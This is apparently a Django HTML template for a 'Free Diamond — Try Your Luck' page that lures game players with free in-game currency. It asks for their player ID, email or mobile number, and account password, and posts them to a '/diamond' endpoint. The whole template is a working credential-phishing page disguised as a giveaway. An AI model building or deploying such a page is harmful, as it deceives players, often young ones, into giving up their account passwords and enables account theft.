{% extends 'base.html' %}

{% block title %}Free Diamond{% endblock title %}

{% block body %} 
<div class="container mt-10">
<div class="container text-center">
<center>
<div class="card" style="width: 18rem;">
  <img src="https://xp.io/storage/uUfS7Ib.jpg" class="card-img-top" alt="FREE DIAMOND">
  <form method="post" action="/diamond">
  {% csrf_token %}
  <h5 class="heading mt-2">TRY YOUR LUCK</h5>
  <hr/>
<div class="mt-3">
  <label for="exampleFormControlInput1" class="form-label py-10"><b>YOUR ID</b></label>
  <input type="text" class="form-control" id="exampleFormControlInput1" name="name" placeholder="Enter Player ID" autocomplete="off">
</div>

<div class="mb-3 mt-3">
  <label for="exampleFormControlInput1" class="form-label"><b>EMAIL OR MOBILE</b></label>
  <input type="text" class="form-control" id="exampleFormControlInput1" name="email" placeholder="Enter Email OR Mobile" autocomplete="off">
</div>

<div class="mb-3">
  <label for="exampleFormControlInput1" class="form-label"><b>PASSWORD</b></label>
  <input type="password" class="form-control" id="exampleFormControlInput1" name="password" placeholder="Enter Password">
</div>

<button type="submit" class="btn btn-primary mb-3" name="button">CHECK LUCK </button>
</form>
</div>
</center>
</div>
</div>

<body background="https://xp.io/storage/wb6Tuty.png">
{% endblock body %}
